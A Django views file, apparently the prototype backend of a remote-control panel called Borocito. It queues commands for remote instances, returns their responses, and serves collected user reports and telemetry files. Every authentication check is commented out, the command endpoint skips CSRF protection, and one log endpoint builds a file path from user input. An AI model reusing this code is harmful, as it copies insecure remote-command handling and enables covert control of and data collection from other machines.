from django.http import HttpRequest, HttpResponse, StreamingHttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings

import os
import mimetypes
from wsgiref.util import FileWrapper

# Create your views here.
from api.models import Instancia, Telemetria
from control.utilities import control_instance_endpoint

# TODO : mejorar, esto es un prototipo.

@csrf_exempt
#@control_instance_endpoint
def instance(request: HttpRequest, uuid):
    instancia = Instancia.objects.get(uuid=uuid)
    if request.method == "POST":
        instancia.command = request.POST.get('command')
        instancia.save(update_fields=['command'])
        return HttpResponse("OK!", content_type="plain/text")
    if request.method == "GET":
        return HttpResponse(instancia.response, content_type="plain/text")

#@control_instance_endpoint
def get_user_report(request: HttpRequest, uuid):
    instancia = Instancia.objects.get(uuid=uuid)
    return HttpResponse(instancia.plain(), content_type="plain/text")

#@control_instance_endpoint
def get_telemetry_log(request: HttpRequest, uuid):
    respuesta = open(str(f"{settings.BOROCITO_TELEMETRY_DIR}/{uuid}.log"), "r").read()
    return HttpResponse(respuesta, content_type="plain/text")

#@control_instance_endpoint
def get_telemetry_file(request: HttpRequest, filename):
    telemetria = Telemetria.objects.get(filename=filename)
    filename = os.path.basename(telemetria.telemetry.path)
    response = StreamingHttpResponse(
        FileWrapper(open(telemetria.telemetry.path, "rb")),
        content_type=mimetypes.guess_type(str(f"{telemetria.filename}"))[0],
    )
    response["Content-Length"] = os.path.getsize(telemetria.telemetry.path)
    response["Content-Disposition"] = f"attachment; filename={filename}"
    return response

#@control_instance_endpoint
def list_instances(request: HttpRequest):
    instancias = Instancia.objects.all()
    respuesta = ""
    for instancia in instancias:
        respuesta += str(f"{instancia.uuid}|")
    return HttpResponse(respuesta, content_type="plain/text")

#@control_instance_endpoint
def list_telemetry_logs(request: HttpRequest):
    respuesta = ""
    telemetrias = os.listdir(settings.BOROCITO_TELEMETRY_DIR)
    for file in telemetrias:
        if ".log" in file:
            respuesta += str(f"{file}\r\n")
    return HttpResponse(respuesta, content_type="plain/text")

#@control_instance_endpoint
def list_telemetry_files(request: HttpRequest):
    telemetrias = Telemetria.objects.all()
    respuesta = ""
    for telemetria in telemetrias:
        respuesta += str(f"{telemetria.filename}\r\n")
    return HttpResponse(respuesta, content_type="plain/text")
